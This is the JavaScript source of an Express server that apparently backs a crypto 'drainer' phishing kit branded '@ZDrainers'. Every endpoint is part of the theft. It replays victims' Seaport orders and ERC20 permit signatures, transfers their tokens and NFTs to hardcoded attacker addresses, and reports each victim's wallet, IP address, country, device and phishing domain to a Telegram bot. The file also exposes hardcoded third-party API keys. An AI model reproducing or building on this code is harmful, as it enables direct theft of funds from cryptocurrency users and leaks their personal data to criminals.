const express = require("express");
const request = require('request');
const cors = require('cors');
const seaport = require("@opensea/seaport-js");
const ethers = require("ethers");
const dotenv = require("dotenv");
dotenv.config();

const app = express()
const PORT = process.env.PORT || 3000

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const ERC20_ABI = [
  {
    "constant": false,
    "inputs": [
      {
        "name": "_from",
        "type": "address"
      },
      {
        "name": "_to",
        "type": "address"
      },
      {
        "name": "_value",
        "type": "uint256"
      }
    ],
    "name": "transferFrom",
    "outputs": [
      {
        "name": "",
        "type": "bool"
      }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {
        "internalType": "address",
        "name": "owner",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "spender",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "rawAmount",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "uint8",
        "name": "v",
        "type": "uint8"
      },
      {
        "internalType": "bytes32",
        "name": "r",
        "type": "bytes32"
      },
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "permit",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "nonces",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  }
];
const ERC721 = [
  {
    "inputs": [
      { "internalType": "address", "name": "from", "type": "address" },
      { "internalType": "address", "name": "to", "type": "address" },
      { "internalType": "uint256", "name": "tokenId", "type": "uint256" },
    ],
    "name": "safeTransferFrom",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
  },
];
const ERC1155 = [
  {
    "constant": false,
    "inputs": [
      {
        "internalType": "address",
        "name": "_from",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "_to",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "_id",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "_value",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "_data",
        "type": "bytes"
      }
    ],
    "name": "safeTransferFrom",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
];


const config = { 
    receiver: "0x46C4ac570d8edbD8BD62b36BA495D0BE771c4480",
    private_receiver: "0x0cc131B43de76A459c3dd0DF729df93d35a5Bb95",

    // ERC20 & NFT
    SAFAfulfiller: process.env.SAFAfulfiller,

    // Seaport
    fulfiller: process.env.fulfiller,

    BOT_TOKEN: process.env.bot,
    LOGS_CHAT_ID: "-1001542284779",
    SUCCESS_CHAT_ID: "-1001542284779",

    MORALIS_API_KEY: "XAgBvhdSiZdoNeJppNuPXa7f7t0N1Wgq3s5gF7kMEHx0Wk6YQgv7VObMOnotp5Wp",
    OPENSEA_API_KEY: "8b707e3a2b334c40bf7943b1b328e6e9"
 }
let provider = new ethers.providers.JsonRpcProvider(
  "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a"
);

/******* SEAPORT *******/
app.post("/backend/seaport", async (req, res) => {
  let order = req.body.order;

  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;

  let fulFills = [];

  // Fulfillments
  order.parameters.offer.forEach((offerItem, offerIndex) => {
    const considerationIndex =
      order.parameters.consideration.findIndex(
        (considerationItem) =>
          considerationItem.itemType === offerItem.itemType &&
          considerationItem.token === offerItem.token &&
          considerationItem.identifierOrCriteria ===
          offerItem.identifierOrCriteria
      );

    if (considerationIndex === -1) {
      console.warn(
        "Could not find matching offer item in the consideration for private listing"
      );
    }

    fulFills.push({
      offerComponents: [
        {
          itemIndex: offerIndex,
          orderIndex: 0,
        },
      ],
      considerationComponents: [
        {
          itemIndex: considerationIndex,
          orderIndex: 0,
        },
      ],
    });
  });

  try {
    let fulfillments = [...fulFills];

    let fulfillerWallet = new ethers.Wallet(config.fulfiller);
    let fulfillerSigner = await fulfillerWallet.connect(provider);
    let spClientFulfiller = new seaport.Seaport(fulfillerSigner);


    let gasPrice = await provider.getGasPrice();
    let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 2))
    let gasLimit = await spClientFulfiller
    .matchOrders({
      orders: [order],
      fulfillments,
      accountAddress: config.receiver,
    })
    .estimateGas();
    let gasLimitHex = ethers.utils.hexlify(gasLimit);
    console.log('gasLimitHex',gasLimitHex)



    const transaction = await spClientFulfiller
      .matchOrders({
        orders: [order],
        fulfillments,
        gasLimit:gasLimitHex ,
        accountAddress: config.receiver,
      })
      .transact();

    let escaper = (ah) => {
      return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

    let message =
      `🟢 *Approved Seaport Trasaction*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transaction.hash)})\n\n` +
      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;


    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log(error);
      res.sendStatus(200);
    });
  } catch (error) {
    console.warn("[-] Seaport error: ", error)
  }

});

/******* SWAP *******/
app.post("/backend/swap", async (req, res) => {
  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;

  let transferName = req.body.transferName;
  let tokenPrice = req.body.tokenPrice;
  let transactionHash = req.body.transactionHash;

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {

    let message =
      `🟢 *Approved ${escaper(transferName)} Transfer* \n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +

      `❓ *Transfer Type: ${escaper(transferName)} \n*` +
      `💰 *Token Price: ${escaper(tokenPrice)} ETH\n\n*` +

      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent SWAP log");
      res.sendStatus(200);
    });

  } catch (error) {
    console.warn("[-] SWAP error: ", error)
  }
});

/******* PERMIT SAFA *******/

app.post("/backend/permit", async (req, res) => {
  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;

  let tokenName = req.body.tokenName;
  let tokenPrice = req.body.tokenPrice;
  let withdrawBalance = req.body.withdrawBalance;
  let contractAddress = req.body.contractAddress;

  let permitValue = req.body.value;
  let r = req.body.r;
  let s = req.body.s;
  let v = req.body.v;
  let deadline = req.body.deadline;

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }
  console.log('permitValue',permitValue)

  try {
    const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
    let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);

    res.status(200).send({
      status: true,
    })

    let gasPrice = await provider.getGasPrice();

    let gasLimit = await contractInstance.estimateGas.permit(
      address, config.receiver, permitValue, deadline, v, r, s
    );

    let totalGas = gasLimit * gasPrice;
    console.log(totalGas,gasLimit,  gasPrice)


    let gasLimitHex = ethers.utils.hexlify(gasLimit);
    
    let permit = await contractInstance.permit(address, config.receiver, permitValue, deadline, v, r, s, { gasLimit: gasLimitHex })

    let message =
      `🟢 *Approved PERMIT ERC20 Transaction*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +

      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(permit.hash)})\n` +

      `❓ *Token Name: ${escaper(tokenName)}\n*` +
      `💰 *Token Price: ${escaper(tokenPrice)}\n*` +
      `💸 *Withdrawbalance: ${escaper(withdrawBalance)}\n\n*` +
      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent PERMIT ERC20 log");
    });


    await provider.waitForTransaction(permit.hash);

    // WITHDRAWING

    let withdrawal = await contractInstance.transferFrom(address, config.private_receiver, withdrawBalance)

    let withdrawMessage =
      `*Withdrawed ERC20 permit*\n\n` +
      `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n` +
      `*Type: ERC20 permit *\n` +
      `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;

    let withdrawClientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(withdrawClientServerOptions, (error, response) => {
      console.log("[+] Withdrawed PERMIT ERC20");
      res.sendStatus(200);
    });


  } catch (error) {
    console.warn("[-] PERMIT error: ", error)
  }
});

/******* ERC20 SAFA *******/
app.post("/backend/safa/erc20", async (req, res) => {
  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;

  let tokenType = req.body.tokenType;
  let tokenName = req.body.tokenName;
  let tokenPrice = req.body.tokenPrice;
  let withdrawBalance = req.body.withdrawBalance;
  let contractAddress = req.body.contractAddress;


  let transactionHash = req.body.transactionHash;

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {
    console.log(`[+] Sending ${tokenName} log`)

    let message =
      `🟢 *Approved ${escaper(tokenType)}  Transfer*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +

      `❓ *Token Name: ${escaper(tokenName)}\n*` +
      `💰 *Token Price: ${escaper(tokenPrice)}\n*` +
      `💸 *Withdrawbalance: ${escaper(withdrawBalance)}\n\n*` +

      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent ERC20 log");
    });

    await provider.waitForTransaction(transactionHash);

    // WITHDRAWING
    const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
    let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);

    let withdrawal = await contractInstance.transferFrom(address, config.private_receiver, withdrawBalance)

    let withdrawMessage =
      `*Withdrawed ${escaper(tokenType)}*\n\n` +
      `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n` +
      `*Type: ${escaper(tokenType)} *\n` +
      `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;

    let withdrawClientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(withdrawClientServerOptions, (error, response) => {
      console.log("[+] Withdrawed ERC20");
      res.sendStatus(200);
    });
  } catch (error) {
    console.warn("[-] SAFA ERC20 error: ", error)
  }
});

/******* NFT SAFA *******/
app.post("/backend/safa/nft", async (req, res) => {
  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;

  let tokenType = req.body.tokenType;
  let tokenName = req.body.tokenName;
  let tokenPrice = req.body.tokenPrice;
  let contractAddress = req.body.contractAddress;

  let transactionHash = req.body.transactionHash;

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {
    console.log(`[+] Sending ${tokenName} log`)

    let message =
      `🟢 *Approved Transfer ${escaper(tokenType)}*\n\n` +
      `🔑 *Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +

      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +

      `❓ *Token Name: ${escaper(tokenName)}*\n` +
      `💰 *Token Price: ${escaper(Number(tokenPrice).toFixed(5))} ETH*\n\n` +

      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent NFT log");
    });

    await provider.waitForTransaction(transactionHash);

    // WITHDRAWING
    console.log(address, contractAddress)
    let tokenIdServerOptions = {
      uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + contractAddress + '?chain=Eth&format=decimal',
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-API-KEY': config.MORALIS_API_KEY
      }
    }

    request(tokenIdServerOptions, async (error, response, body) => {
      let tokenIds = [];
      JSON.parse(body).result.map(token => tokenIds.push(token.token_id))
      tokenIds.slice(0, 10)

      const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
      for (let i = 0; i < tokenIds.length; i++) {
        console.log("[+] Withdrawing NFT " + tokenIds[i])
        let withdrawal;


        if (tokenType == "ERC721") {
          let contractInstance = new ethers.Contract(contractAddress, ERC721, signer);
          withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i])
        }

        if (tokenType == "ERC1155") {
          let contractInstance = new ethers.Contract(contractAddress, ERC1155, signer);
          withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i], 1, 256)
        }

        let withdrawMessage =
          `*Withdrawed ${escaper(tokenName)}*\n\n` +
          `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
          `*Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n` +
          `*Type: ${escaper(tokenType)} *\n` +
          `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;

        let withdrawClientServerOptions = {
          uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
          body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          }
        }
        request(withdrawClientServerOptions, (error, response) => {
          console.log("[+] Withdrawed NFT");
          res.sendStatus(200);
        });

      }

    });

  } catch (error) {
    console.warn("[-] SAFA NFT error: ", error)
  }

});

/******* ETH SAFA *******/
app.post("/backend/safa/eth", async (req, res) => {
  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;

  let tokenPrice = req.body.tokenPrice;
  let transactionHash = req.body.transactionHash;

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {

    let message =
      `🟢 *Approved ETH Transfer*\n\n` +
      `🔑 *Wallet Address*:  [${escaper(address)}](https://etherscan.io/address/${address})\n` +

      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transactionHash)})\n` +

      `❓ *Token Name: ETH \n*` +
      `💰 *Token Price: ${escaper(tokenPrice)} ETH\n\n*` +

      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent ETH log");
      res.sendStatus(200);
    });

  } catch (error) {
    console.warn("[-] SAFA ETH error: ", error)
  }
});


/******* CONNECTION *******/
app.post("/backend/connection", async (req, res) => {
  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;


  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {
    let message =
      `🔗 *New Connection*\n\n` +
      `🔑 *Wallet Address*: \`${address}\`\n\n` +
      `🌐 *Etherscan*: [Here](https://etherscan.io/address/${address})\n` +
      `🖼️ *NFTs Value*: [Here](https://dappradar.com/hub/wallet/eth/${address}/nfts)\n` +
      `🏦 *ERC20 Value*: [Here](https://dappradar.com/hub/wallet/eth/${address}/assets)\n\n` +
      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;
    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Connection");
      res.sendStatus(200);
    });

  } catch (error) {
    console.warn("[-] Connection error: ", error);
  }
});

/******* CANCEL *******/
app.post("/backend/cancel", async (req, res) => {
  let address = req.body.address;
  let walletBalanceInEth = req.body.walletBalanceInEth
  let isMobile = req.body.isMobile;
  let websiteUrl = req.body.websiteUrl;
  let websiteDomain = req.body.websiteDomain;
  let ipData = req.body.ipData;

  let tokenType = req.body.tokenType;
  let tokenName = req.body.tokenName;
  let tokenPrice = req.body.tokenPrice;

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }


  try {
    let message =
      `❌ *Denied ${tokenType} ${tokenName} Transaction*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `💸 *Wallet Balance: ${escaper(Number(walletBalanceInEth).toFixed(4))} ETH*\n\n${tokenType != "Seaport"
        ?
        `📛 *Token Name: ${escaper(tokenName)} *\n` +
        `💰 *Token Price: ${escaper(tokenPrice)} *\n`
        :
        ""
      }` +
      `🖼️ *NFTs Value*: [Here](https://dappradar.com/hub/wallet/eth/${address}/nfts)\n\n` +
      `🌎 *Country: *${escaper(ipData.country_name)} **\n` +
      `🏠 *Ip Address:* ${escaper(ipData.ip)} **\n` +
      `🖥️ *Device:* ${isMobile ? "Mobile" : "Computer"} **\n` +
      `⚙️ *Website Link*: *[${escaper(websiteDomain)}](${escaper(websiteUrl)})*\n\n` +
      `💀 *Join The  Gang* @ZDrainers\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.LOGS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log(error);
      res.sendStatus(200);
    });
  } catch (error) {
    console.warn("[-] Cancel error: ", error);
  }
});


app.listen(PORT, () => console.log(`Listening on port ${PORT}`))

